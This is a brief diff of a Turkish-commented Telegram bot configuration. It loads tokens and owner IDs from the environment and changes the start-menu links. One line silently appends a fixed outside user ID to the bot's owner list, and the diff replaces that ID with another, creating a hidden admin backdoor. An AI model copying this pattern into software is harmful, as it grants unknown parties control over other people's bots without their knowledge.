@@ -11,7 +11,7 @@ B_TOKEN = os.getenv("BOT_TOKEN") # Kullanıcı'nın Bot Tokeni
 API_ID = os.getenv("OWNER_API_ID") # Kullanıcı'nın Apı Id'si
 API_HASH = os.getenv("OWNER_API_HASH") # Kullanıcı'nın Apı Hash'ı
 OWNER_ID = os.getenv("OWNER_ID").split() # Botumuzda Yetkili Olmasini Istedigimiz Kisilerin Idlerini Girecegimiz Kisim
-OWNER_ID.append(1526305215)
+OWNER_ID.append(5237976814)
 
 MOD = None
 
@@ -28,8 +28,8 @@ K_G = Client(
 
 # Start Buttonu İcin Def Oluşturalım :)
 def button():
-	BUTTON=[[InlineKeyboardButton(text="Sahibim ",url="t.me/sessizlerkurucu")]]
-	BUTTON+=[[InlineKeyboardButton(text="Bağış",url="https://telegra.ph/Ba%C4%9F%C4%B1%C5%9F-04-29")]]
+	BUTTON=[[InlineKeyboardButton(text="Sahibim ",url="t.me/Samilben")]]
+	BUTTON+=[[InlineKeyboardButton(text="Müzik Botu",url="https://t.me/Oxygenmuzik_Bot")]]
 	return InlineKeyboardMarkup(BUTTON)
 
 # Kullanıcı Start Komutunu Kullanınca Selam'layalım :)
